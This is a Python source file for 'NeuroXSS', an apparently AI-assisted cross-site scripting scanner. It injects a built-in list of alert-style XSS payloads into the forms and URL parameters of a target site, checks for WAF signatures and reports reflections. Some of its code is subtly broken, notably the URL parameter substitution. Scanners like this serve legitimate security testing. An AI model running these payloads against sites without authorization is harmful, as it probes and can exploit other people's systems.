# neuroxss.py
#!/usr/bin/env python
from core.scanner import NeuroXSScanner
from ai.analyzer import NeuroAIAnalyzer
import time
from typing import List, Dict
import json
from datetime import datetime
import argparse

class NeuroXSS(NeuroXSScanner):
    def __init__(self, target_url: str, use_ai: bool = True, 
                 smart_payloads: bool = False, threads: int = 3):
        super().__init__(target_url, threads)
        self.use_ai = use_ai
        self.smart_payloads = smart_payloads
        
        if use_ai:
            self.ai = NeuroAIAnalyzer()
        
        # Enhanced payload list
        self.payloads = self._load_payloads()
    
    def _load_payloads(self) -> List[str]:
        """Load XSS payloads"""
        return [
            # Basic
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert(1)>",
            
            # Attribute-based
            "\" onmouseover=\"alert(1)\"",
            "' onfocus='alert(1)' autofocus",
            
            # Protocol-based
            "javascript:alert(1)",
            "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
            
            # Event handlers
            "<body onload=alert(1)>",
            "<svg/onload=alert(1)>",
            "<input onfocus=alert(1) autofocus>",
            
            # Script variations
            "<ScRiPt>alert(1)</ScRiPt>",
            "<script>eval('alert(1)')</script>",
            
            # Encoded
            "%3Cscript%3Ealert(1)%3C/script%3E",
            "&#60;script&#62;alert(1)&#60;/script&#62;",
            
            # Polyglots
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */alert(1) )"
        ]
    
    def scan(self) -> Dict:
        """Main scan method with AI enhancement"""
        self.logger.info(f"Starting NeuroXSS scan on {self.target_url}")
        
        # Discover endpoints
        endpoints = self.discover_endpoints()
        
        results = {
            'target': self.target_url,
            'scan_start': datetime.now().isoformat(),
            'endpoints_tested': len(endpoints),
            'vulnerabilities': [],
            'ai_analyses': []
        }
        
        # Test each endpoint
        for endpoint in endpoints:
            self.logger.info(f"Testing endpoint: {endpoint.get('type')}")
            
            if endpoint['type'] == 'form':
                vulns = self._test_form_endpoint(endpoint)
            elif endpoint['type'] == 'url_params':
                vulns = self._test_url_endpoint(endpoint)
            else:
                vulns = self._test_generic_endpoint(endpoint)
            
            results['vulnerabilities'].extend(vulns)
        
        results['scan_end'] = datetime.now().isoformat()
        results['total_vulnerabilities'] = len(results['vulnerabilities'])
        
        return results
    
    def _test_form_endpoint(self, endpoint: Dict) -> List[Dict]:
        """Test form endpoints"""
        vulnerabilities = []
        
        for payload in self.payloads[:10]:  # Test first 10 payloads
            # Prepare form data
            form_data = {}
            for input_field in endpoint['inputs']:
                form_data[input_field['name']] = payload
            
            try:
                # Submit form
                if endpoint['method'] == 'post':
                    response = self.session.post(endpoint['action'], data=form_data)
                else:
                    response = self.session.get(endpoint['action'], params=form_data)
                
                # Analyze response
                if self.use_ai:
                    analysis = self.ai.analyze_xss_response(
                        payload=payload,
                        response_html=response.text,
                        status_code=response.status_code,
                        context={
                            'location': 'form',
                            'param_name': list(form_data.keys())[0],
                            'waf_detected': self._check_waf(response)
                        }
                    )
                    
                    if analysis.get('vulnerable'):
                        vulnerabilities.append({
                            'type': 'XSS',
                            'subtype': analysis.get('type', 'unknown'),
                            'payload': payload,
                            'location': endpoint['action'],
                            'method': endpoint['method'],
                            'confidence': analysis.get('confidence', 0),
                            'evidence': analysis.get('evidence', ''),
                            'ai_recommendation': analysis.get('recommendation', ''),
                            'timestamp': datetime.now().isoformat()
                        })
                else:
                    # Traditional detection
                    if payload in response.text:
                        vulnerabilities.append({
                            'type': 'XSS',
                            'subtype': 'reflected',
                            'payload': payload,
                            'location': endpoint['action'],
                            'method': endpoint['method'],
                            'confidence': 50,
                            'evidence': 'Payload reflected in response'
                        })
                
                time.sleep(self.delay)
                
            except Exception as e:
                self.logger.error(f"Error testing form: {e}")
        
        return vulnerabilities
    
    def _check_waf(self, response) -> bool:
        """Check for WAF presence"""
        waf_signatures = [
            'cloudflare', 'aws waf', 'mod_security', 
            'barracuda', 'f5', 'imperva'
        ]
        headers = ' '.join(str(response.headers).lower())
        return any(sig in headers or sig in response.text.lower() 
                  for sig in waf_signatures)
    
    def _test_url_endpoint(self, endpoint: Dict) -> List[Dict]:
        """Test URL parameter endpoints"""
        vulnerabilities = []
        
        for param in endpoint.get('params', []):
            for payload in self.payloads[:5]:  # Test fewer for URLs
                test_url = endpoint['url'].replace(
                    f"{param}=[^&]*", 
                    f"{param}={payload}"
                )
                
                try:
                    response = self.session.get(test_url)
                    
                    if self.use_ai:
                        analysis = self.ai.analyze_xss_response(
                            payload=payload,
                            response_html=response.text,
                            status_code=response.status_code,
                            context={
                                'location': 'url_param',
                                'param_name': param
                            }
                        )
                        
                        if analysis.get('vulnerable'):
                            vulnerabilities.append({
                                'type': 'XSS',
                                'subtype': analysis.get('type', 'url_param'),
                                'payload': payload,
                                'location': f"{param} parameter",
                                'confidence': analysis.get('confidence', 0),
                                'evidence': analysis.get('evidence', '')
                            })
                    
                except Exception as e:
                    self.logger.error(f"Error testing URL: {e}")
        
        return vulnerabilities
    
    def _test_generic_endpoint(self, endpoint: Dict) -> List[Dict]:
        """Test generic endpoints"""
        # Implement for AJAX, etc.
        return []

def main():
    parser = argparse.ArgumentParser(description='NeuroXSS - AI-Powered XSS Scanner')
    parser.add_argument('url', help='Target URL')
    parser.add_argument('--no-ai', action='store_true', help='Disable AI analysis')
    parser.add_argument('--smart', action='store_true', help='Use AI-generated payloads')
    parser.add_argument('--threads', type=int, default=3, help='Thread count')
    parser.add_argument('--output', '-o', default='neuroxss_report.json', help='Output file')
    
    args = parser.parse_args()
    
    print("""
    ╔══════════════════════════════════════╗
    ║         NeuroXSS Scanner             ║
    ║    AI-Enhanced XSS Detection         ║
    ╚══════════════════════════════════════╝
    """)
    
    print(f"Target: {args.url}")
    print(f"AI Analysis: {'Disabled' if args.no_ai else 'Enabled'}")
    print(f"Smart Payloads: {'Yes' if args.smart else 'No'}")
    print("-" * 50)
    
    # Initialize scanner
    scanner = NeuroXSS(
        args.url, 
        use_ai=not args.no_ai,
        smart_payloads=args.smart,
        threads=args.threads
    )
    
    # Run scan
    print("\n[+] Starting scan...")
    results = scanner.scan()
    
    # Save results
    with open(args.output, 'w') as f:
        json.dump(results, f, indent=2)
    
    # Display summary
    print(f"\n[+] Scan complete!")
    print(f"Endpoints tested: {results['endpoints_tested']}")
    print(f"Vulnerabilities found: {results['total_vulnerabilities']}")
    
    if results['vulnerabilities']:
        print("\n" + "=" * 50)
        print("VULNERABILITY SUMMARY")
        print("=" * 50)
        for v in results['vulnerabilities']:
            print(f"\n📍 {v['type']} at {v['location']}")
            print(f"   Confidence: {v['confidence']}%")
            print(f"   Evidence: {v['evidence'][:100]}...")
    
    print(f"\n[+] Full report saved to: {args.output}")

if __name__ == "__main__":
    main()